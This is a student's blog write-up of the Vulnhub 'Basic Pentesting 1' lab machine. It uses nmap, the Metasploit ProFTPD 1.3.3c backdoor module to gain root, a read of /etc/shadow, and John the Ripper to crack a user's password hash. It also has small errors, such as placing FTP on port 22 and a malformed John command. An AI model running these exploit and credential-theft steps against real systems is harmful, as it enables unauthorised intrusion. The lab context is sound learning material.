---
title: "Vulnhub's Basic Pentesting 1 Writeup"
date: 2020-02-16T02:01:58+05:30
---

#### Basic Pentesting 1

***At first impression, this box seems rather intimidating because I'm a complete beginner to pen-testing and this already seems like a challenge. Nevertheless, I'm going to try and pull through with the help of tutors and other students. :)***

#### FTP metasploit method:

1. Open terminal in pentest VM and type in command `ifconfig`

`ifconfig` shows you the network config of the pentest VM

![Basic%20Pentesting%201/Untitled.png](/BASIC1/basic05.png)

NMAP Scan

- First we need to ping the VM from Kali Linux to the test connection:
    - `ping 172.16.149.133`

    ![Basic%20Pentesting%201/Untitled%201.png](/BASIC1/basic1.png)


- Use NMAP to find vulnerability
    1. Find the different NMAP scanning options with `nmap --help`

        Here's an extended list of the available commands nmap can offer:

    ![Basic%20Pentesting%201/Untitled%203.png](/BASIC1/basic3.png)

    ![Basic%20Pentesting%201/Untitled%204.png](/BASIC1/basic4.png)

    ![Basic%20Pentesting%201/Untitled%205.png](/BASIC1/basic5.png)

- Since we need to gather as much intel as possible, we can conduct a full port Nmap scan:
    - `nmap -A -p- 172.16.149.133`

    ![Basic%20Pentesting%201/Untitled%206.png](/BASIC1/basic6.png)

    - Now for this first attempt, lets try and look at the FTP server from the port scan.
    - We can see that ftp is running on port 22
    - Let's see if its vulnerable to a FTPD exploit
    - Look up ProFTPD exploit [here]([https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor](https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_133c_backdoor))
        - alternatively you can use the command in Kali: `searchsploit Proftpd 1.3.3c`

        ![Basic%20Pentesting%201/Untitled%207.png](/BASIC1/basic7.png)

    - From the 2nd exploit title we can see that it is a potential metasploit module. Let's now fire up metasploit in Kali Linux
        - `msfconsole`

        ![Basic%20Pentesting%201/Untitled%208.png](/BASIC1/basic8.png)

        ![Basic%20Pentesting%201/Untitled%209.png](/BASIC1/basic9.png)

        Now we need to search for the Proftpd exploit using:

        - `search Proftpd 1.3.3c` which is entered inthe msf5 terminal window
        - You will get:

        ![Basic%20Pentesting%201/Untitled%2010.png](/BASIC1/basic10.png)

        ![Basic%20Pentesting%201/Untitled%2011.png](/BASIC1/basic11.png)

    - The highlighted line shows the found Proftpd 133c exploit ^

    Now we found Proftpd metasploit, we need to now execute the exploit, THEN change the RHOST to allow the Pentesting VM IP address to be the target (commands as follow):

    - `use exploit/unix/ftp/proftpd_133c_backdoor`

    ![Basic%20Pentesting%201/Untitled%2012.png](/BASIC1/basic12.png)

    - `set RHOST 172.16.149.133`

    ![Basic%20Pentesting%201/Untitled%2013.png](/BASIC1/basic13.png)

    NOW, RUN THE MODULE!! `run`

    ![Basic%20Pentesting%201/Untitled%2014.png](/BASIC1/basic14.png)

    DONE!!

Now without touching the MSF terminal window, lets head back to your original Kali terminal window and see the results:

- `ls` to see the content of the directory

    ![Basic%20Pentesting%201/Untitled%2015.png](/BASIC1/basic15.png)

- and `whoami` to see if you have root access or not

    ![Basic%20Pentesting%201/Untitled%2016.png](/BASIC1/basic16.png)

Thus, as you can `root` is highlighted, which means you have root access now! :)

And here, we successfully got ROOT access.

#### Task 2: Determining the login/pass:

- This next stage I had to get some help from Hayden (a fellow student) because I had no idea on how to progress, but with his help i was more and more curious on how to get inside into different folders. Thus, these screenshots are from Hayden's writeup since he explained in-depth on how he achieved it but I didn't have enough time to re-attempt myself as I was getting too stuck into `tryhackme` challenges. Nevertheless, here's what I learnt and broke down from his explanation:
    - First I would need to find where the password would be stored in, and based off my Linux knowledge I have learnt within my cyber security subject at UTS, I recall that passwords are stored in `/shadow file` in the `/etc` directory.
    - By typing `cat shadow` it can list all the contents within the shadow file :

    ![Basic%20Pentesting%201/Untitled%2017.png](/BASIC1/basic17.png)

    - Now that I've found `marlinspike`'s password from listing all the contents, I now need to find out its specific encryption format and to decrypt it into a useable format.

    This next step was a bit difficult as we both struggled with.

    - We now need to do some research into what decryption format that `marlinspike`'s password uses and several attempts and a few in-depth walkthroughs later, we managed to find that you can use a password-decrypting software called: `John the Ripper` and learnt how to use it
    - From this [article]([https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/](https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/)) it describes John the Ripper as:
        - `John the Ripper is a free password cracking software tool that combines a number of password crackers into one package, autodetects password hash types, and includes a customizable cracker. It can be run against various encrypted password formats including several crypt password hash types commonly found in Linux or Windows.`

    - Thus, we then exported the password into a local file named `john.txt` (following the guide) and used the following command to decrypt the password:
        - `john encoding=raw john.txt`

    Consequently, the password for `marlinspike` was `"marlinspike"` an exact replica and a poor security practice!

    - We then confirmed whether or not this was correct by re-logging in with the same account user and password:

    ![Basic%20Pentesting%201/Untitled%2018.png](/BASIC1/basic18.png)

And Voila! We now not only have root access but have access to the user and password details!

***My expectation for this box has changed quite a bit since my first impression, especially after receiving Hayden's help for determining the login/pass as that was the most difficult part of the box. Initially I have felt that this box was extremely difficult as I had no idea on what to do, but after a few walkthrough guides and the tutors'/students' help I managed to pull through. However, I still would recommend this box after attempting a tryhackme box, only because tryhackme boxes are guided so you know exactly what you are doing.  - D Y L A N***
